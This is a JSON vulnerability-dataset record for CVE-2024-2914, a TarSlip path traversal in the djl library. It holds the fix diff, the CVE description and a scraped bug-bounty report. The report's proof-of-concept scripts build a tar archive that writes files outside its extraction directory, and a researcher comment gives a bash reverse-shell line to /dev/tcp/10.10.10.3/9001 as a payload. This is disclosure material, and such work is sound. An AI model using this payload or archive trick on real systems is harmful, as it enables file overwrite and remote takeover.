{
    "CVE-2024-2914": {
        "published_date": "2024-06-06T17:55:55.145Z",
        "patch_commits": [
            {
                "url": "https://github.com/deepjavalibrary/djl/commit/5235be508cec9e8cb6f496a4ed2fa40e4f62c370",
                "content": "[spark] Fixes python tarslip security concern\n\nFilename: extensions/spark/setup/djl_spark/util/files_util.py:\n```\n@@ -70,6 +70,20 @@\ndef download_and_extract(url, path):\n     :param url: The url of the tar file.\n     :param path: The path to the file to download to.\n     \"\"\"\n+    def is_within_directory(directory, target):\n+        abs_directory = os.path.abspath(directory)\n+        abs_target = os.path.abspath(target)\n+        prefix = os.path.commonprefix([abs_directory, abs_target])\n+        return prefix == abs_directory\n+\n+    def safe_extract(tar, path=\".\", members=None, *, numeric_owner=False):\n+        for member in tar.getmembers():\n+            member_path = os.path.join(path, member.name)\n+            if not is_within_directory(path, member_path):\n+                raise Exception(\"Attempted Path Traversal in Tar File\")\n+\n+        tar.extractall(path, members, numeric_owner=numeric_owner)\n+\n     if not os.path.exists(path):\n         os.makedirs(path)\n     if not os.listdir(path):\n\n@@ -78,9 +92,9 @@\ndef download_and_extract(url, path):\n             if url.startswith(\"s3://\"):\n                 s3_download(url, tmp_file)\n                 with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n-                    t.extractall(path=path)\n+                    safe_extract(t, path=path)\n             elif url.startswith(\"http://\") or url.startswith(\"https://\"):\n                 with urlopen(url) as response, open(tmp_file, 'wb') as f:\n                     shutil.copyfileobj(response, f)\n                 with tarfile.open(name=tmp_file, mode=\"r:gz\") as t:\n-                    t.extractall(path=path)\n+                    safe_extract(t, path=path)\n```"
            }
        ],
        "sw_version": "v0.26.0",
        "sw_version_wget": "https://github.com/deepjavalibrary/djl/archive/refs/tags/v0.26.0.zip",
        "description": "A TarSlip vulnerability exists in the deepjavalibrary/djl, affecting version 0.26.0 and fixed in version 0.27.0. This vulnerability allows an attacker to manipulate file paths within tar archives to overwrite arbitrary files on the target system. Exploitation of this vulnerability could lead to remote code execution, privilege escalation, data theft or manipulation, and denial of service. The vulnerability is due to improper validation of file paths during the extraction of tar files, as demonstrated in multiple occurrences within the library's codebase, including but not limited to the files_util.py and extract_imagenet.py scripts.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/b064bd2f-bf6e-4fc0-898e-7d02a9b97e24",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nTarslip that leads to arbitary file write in deepjavalibrary/djl\nValid\nReported on Feb 13th 2024\nDescription\nTarSlip is a form of directory traversal that can be exploited by extracting files from an archive. This vulnerability allows an attacker to manipulate file paths within the archives to overwrite arbitrary files on the target system, potentially leading to remote code execution or other malicious activities.\nProof of Concept\nCreate malicious tar file\n// djl_tarslip.py\nimport os\nimport tarfile\n\n# Specify the directory where the malicious script will be placed\nmalicious_dir = '/home/anis/Desktop'\n\n# Create the TAR archive with the malicious file\nwith tarfile.open('tarslip.tar', 'w') as tar:\n    # Add the malicious script to the TAR archive with the desired path outside the target directory\n    tar.add('sensitive_file', arcname=f'../../../../../..{malicious_dir}/sensitive_file')\nExtract the malicious file\n// djl_exploit.py\nimport os\nimport tarfile\nfrom tqdm import tqdm\n\n# this code was taken from https://github.com/deepjavalibrary/djl/blob/master/basicdataset/src/main/resources/imagenet/extract_imagenet.py#L159\ndef extract_train(tar_fname, target_dir, with_rec=False, num_thread=1):\n    os.makedirs(target_dir,exist_ok=True)\n    with tarfile.open(tar_fname) as tar:\n        print(\"Extracting \"+tar_fname+\"...\")\n        # extract each class one-by-one\n        pbar = tqdm(total=len(tar.getnames()))\n        for class_tar in tar:\n            pbar.set_description('Extract '+class_tar.name)\n            tar.extract(class_tar, target_dir)\n            class_fname = os.path.join(target_dir, class_tar.name)\n            class_dir = os.path.splitext(class_fname)[0]\n            os.makedirs(class_dir,exist_ok=True)\n            with tarfile.open(class_fname) as f:\n                def is_within_directory(directory, target):\n                    \n                    abs_directory = os.path.abspath(directory)\n                    abs_target = os.path.abspath(target)\n                \n                    prefix = os.path.commonprefix([abs_directory, abs_target])\n                    \n                    return prefix == abs_directory\n                \n                def safe_extract(tar, path=\".\", members=None, *, numeric_owner=False):\n                \n                    for member in tar.getmembers():\n                        member_path = os.path.join(path, member.name)\n                        if not is_within_directory(path, member_path):\n                            raise Exception(\"Attempted Path Traversal in Tar File\")\n                \n                    tar.extractall(path, members, numeric_owner=numeric_owner) \n                    \n                \n                safe_extract(f, class_dir)\n            os.remove(class_fname)\n            pbar.update(1)\n        pbar.close()\n\n\nif __name__==\"__main__\":\n    extract_train(\"tarslip.tar\",\"tmp\")\nNotice that the patch is not implemented properly so the vulnerability remains\nPOC\nsame procedure to exploit for other occurrences of this vulnerability in this library\nImpact\nThe ZipSlip/TarSlip vulnerability allows an attacker to overwrite arbitrary files on the target system, which can lead to severe consequences such as :\n- Remote code execution: By overwriting system executables or configuration files, an attacker can execute arbitrary code on the target system with the privileges of the vulnerable application.\n- Privilege escalation: If the vulnerable application is running with elevated privileges, an attacker can exploit the vulnerability to gain higher privileges on the target system.\n- Data theft or manipulation: By overwriting sensitive data files, an attacker can steal or manipulate sensitive information stored on the target system.\n- Denial of Service (DoS): If the vulnerable application is critical to the target system's operation, an attacker can exploit the vulnerability to crash or disrupt the application, leading to a denial of service.```\nWe are processing your report and will contact thedeepjavalibrary/djl team within 24 hours.a year ago\nWe have sent a magic link to the deepjavalibrary/djl team via the email provided in their security policya year ago\nDan McInerneymodified the Severity from Critical (9.8) to High (7.7)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nIf I'm not mistaken, I don't see any DJL code in the PoC. 1) Do you have a PoC that works against DJL? 2) Is this exploitable remotely or is there a reasonable place in DJL code that would be reasonably exposed remotely that allows for this exploitation?\nIf the answer to either of those is no, then we will mark this informative.\n0xanis\ncommenteda year ago\nResearcher\nHi Dan , for files_util.py L67 occurrence it's possible to exploit it remotely .\nSteps\nlet's take this demo from the official documentation as an example :\n#!/usr/bin/env python\n#\n# Copyright 2023 Amazon.com, Inc. or its affiliates. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"). You may not use this file\n# except in compliance with the License. A copy of the License is located at\n#\n# http://aws.amazon.com/apache2.0/\n#\n# or in the \"LICENSE.txt\" file accompanying this file. This file is distributed on an \"AS IS\"\n# BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, express or implied. See the License for\n# the specific language governing permissions and limitations under the License.\n\nimport sys\nfrom pyspark.sql.session import SparkSession\nfrom djl_spark.task.text import TextGenerator\n\n\nif __name__ == \"__main__\":\n    \"\"\"\n        Usage: text_generation.py [output_path]\n    \"\"\"\n    output_path = sys.argv[1] if len(sys.argv) > 1 else None\n    spark = SparkSession \\\n        .builder \\\n        .appName(\"TextGenerationExample\") \\\n        .getOrCreate()\n    sc = spark.sparkContext\n    sc.setLogLevel(\"ERROR\")\n\n    # Input\n    df = spark.createDataFrame(\n        [\n            (1, \"My name is Julien and I like to\"),\n            (2, \"My name is Thomas and my main\"),\n            (3, \"My name is Mariama, my favorite\")\n        ],\n        [\"id\", \"text\"]\n    )\n    df.show(truncate=False)\n    # +---+-------------------------------+\n    # |id |text                           |\n    # +---+-------------------------------+\n    # |1  |My name is Julien and I like to|\n    # |2  |My name is Thomas and my main  |\n    # |3  |My name is Mariama, my favorite|\n    # +---+-------------------------------+\n\n    # Text generation\n    generator = TextGenerator(input_col=\"text\",\n                              output_col=\"prediction\",\n                              hf_model_id=\"facebook/opt-125m\")\n    outputDf = generator.generate(df, do_sample=True, max_length=30)\n\n    if output_path:\n        print(\"Saving results S3 path: \" + output_path)\n        outputDf.write.mode(\"overwrite\").parquet(output_path)\n    else:\n        print(\"Printing results output stream\")\n        outputDf.printSchema()\n        # root\n        #  |-- id: long (nullable = true)\n        #  |-- text: string (nullable = true)\n        #  |-- prediction: string (nullable = true)\n\n        outputDf.show(truncate=False)\n        # +---+-------------------------------+---------------------------------------------------------------------------------------------------------------------------------+\n        # |id |text                           |prediction                                                                                                                       |\n        # +---+-------------------------------+---------------------------------------------------------------------------------------------------------------------------------+\n        # |1  |My name is Julien and I like to|My name is Julien and I like to travel to some weird place in the world where there is nowhere to go or where I can't have fun   |\n        # |2  |My name is Thomas and my main  |My name is Thomas and my main purpose is to be a good friend to you.\\nIt is my intention to try to make you understand the things|\n        # |3  |My name is Mariama, my favorite|My name is Mariama, my favorite anime is YuGiOh! and I enjoy writing, I used to be a manga fan, I want to                        |\n        # +---+-------------------------------+---------------------------------------------------------------------------------------------------------------------------------+\n\n    spark.stop()\nVulnerable DataFlow\nlines 50-53 will make an instance of classTextGenerator from djl-spark-extension which take either huggingface model id or an URL . then call generate function inside that function the vulnerable occurrence is used to download and extract the model\ndef generate(self, dataset, **kwargs):\n        \"\"\"\n        Performs text generation on the provided dataset.\n\n        :param dataset: input dataset\n        :return: output dataset\n        \"\"\"\n        if self.engine is None or self.engine.lower() != \"pytorch\":\n            raise ValueError(\"Only PyTorch engine is supported.\")\n\n        if self.model_url:\n            cache_dir = files_util.get_cache_dir(APPLICATION, GROUP_ID,\n                                                 self.model_url)\n           # here \n            files_util.download_and_extract(self.model_url, cache_dir)\n            dependency_util.install(cache_dir)\n            model_id_or_path = cache_dir\n        elif self.hf_model_id:\n            model_id_or_path = self.hf_model_id\n        else:\n            raise ValueError(\n                \"Either model_url or hf_model_id must be provided.\")\nExploitation\nan attacker have to create a malicious model by hijacking a good model and share it on huggingface so the victim use model id to download it or share it elsewhere and the victim use URL . once the model is downloaded and extracted you achieve arbitrary file overwrite . also the fact that ai models are considered safe by most dev facilitate the exploitation even more .\nExample of file overite to RCE: a bash RCE payload to overwrite .bashrc : /bin/bash -i >& /dev/tcp/10.10.10.3/9001 0>&1 there is many way to achieve an RCE this is just one of them\nas for the other occurrence i think it can only be exploited locally ( i will look more into it and let you know)\n0xanis modified the reporta year ago\nDan McInerney gave praisea year ago\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nDan McInerneymodified the Severity from High (8.1) to High (7.5)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nPerfect, you found a documented example of how it might exploited. The maintainer would, however, have a valid point if they want to say that the onus is on the user of the library to not download untrusted models, however I'll leave this open to maintainer review. User Interaction changed to Required since the user needs to specify they wish to download a potentially untrusted model.\n0xanis\ncommenteda year ago\nResearcher\nAs a cybersecurity researcher , I would argue that the responsibility of ensuring the security of the library should be shared between the library maintainers and the users. While it is true that users should exercise caution when downloading untrusted models, the maintainers should also implement security measures to mitigate potential risks. In this case, the library maintainers should consider implementing a whitelist of trusted model sources, as well as providing clear documentation and warnings about the potential risks associated with downloading untrusted models. Additionally, they could implement a secure download mechanism that verifies the authenticity and integrity of the downloaded models. From a country perspective, this shared responsibility approach aligns with the principles of cybersecurity best practices and international standards, such as those outlined by the International Organization for Standardization (ISO) and the National Institute of Standards and Technology (NIST) in the United States. By adopting a shared responsibility approach, both the library maintainers and the users can work together to ensure the security and integrity of the library, ultimately contributing to a safer and more secure ML ecosystem.\nWe have sent a follow up to the deepjavalibrary/djl team. We will try again in 4 days.a year ago\nWe have sent a second follow up to the deepjavalibrary/djl team. We will try again in 7 days.a year ago\n0xanis\ncommenteda year ago\nResearcher\nHi , any update ?\nDan McInerneymodified the Severity from High (7.5) to High (8.1)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nSince the maintainers fixed it and you have a valid proof of concept of exploitability we will mark this valid after the 45 day maintainer response window expires. We leave this window in case the maintainer has more information they'd like to share that impacts the validity or CVSS score of the finding.\nDan McInerney\ncommenteda year ago\nAdmin\nGreat writeups and PoC's.\nWe have sent a third follow up to the deepjavalibrary/djl team. We will try again in 14 days.a year ago\nWe have sent a fourth follow up to the deepjavalibrary/djl team. We will send a final notification 48 hours before report publication.a year ago\nDan McInerneymodified the Severity from High (8.1) to High (7.8)a year ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nDan McInerney validated this vulnerabilitya year ago\nMy apologies for the previous comment, I took a closer look everything including the second PoC you have from the djl demo example. It appears to be somewhat unrelated to the original instances of the report. Normally, a tarslip or zipslip in a local library, especially in utility scripts, would be considered just an informative report. In this case, I do see that the developers created a branch called CVE, and fixed this particular issue here: https://github.com/deepjavalibrary/djl/commit/5235be508cec9e8cb6f496a4ed2fa40e4f62c370\nSo we will consider this as valid due to maintainer fix and labeling.\n0xanishas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nDan McInerneyset the scheduled publication date to May 16th 2024 UTCa year ago\nCVE-2024-2914assigned to this report.a year ago\nDan McInerneymarked this as fixedin 0.27.0with commit5235bea year ago\nThe fix bounty has been dropped\nWe have sent a warning to the deepjavalibrary/djl team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-2914has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-2914\n(Published)\nVulnerability Type\nCWE-29: Path Traversal: '\\..\\filename'\nSeverity\nHigh (7.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n0.26.0\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$750\nFix Bounty\n$187.5\nFound by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes fully detailed scripts and guidelines to exploit the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-29",
                "value": "CWE-29 Path Traversal: '\\..\\filename'"
            }
        ]
    }
}